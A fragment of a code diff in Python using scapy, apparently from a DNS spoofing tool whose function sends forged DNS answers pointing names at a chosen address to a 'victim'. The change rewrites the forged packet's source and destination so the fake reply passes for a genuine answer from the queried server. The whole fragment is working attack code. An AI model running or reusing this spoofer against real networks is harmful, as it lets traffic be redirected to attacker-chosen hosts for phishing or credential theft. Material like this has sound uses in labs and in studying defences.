@@ -12,7 +12,7 @@ def dns_responder(local_ip: str, victim_ip: str, spoof_ip: str):
             pkt[DNS].ancount == 0
         ):
             if str(pkt["DNS Question Record"].qname):
-                spf_resp = (IP(dst=victim_ip)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip)))
+                spf_resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip)))
                 send(spf_resp)
                 print(spf_resp.show())
                 return f"Spoofed DNS Response Sent: {pkt[IP].src}"
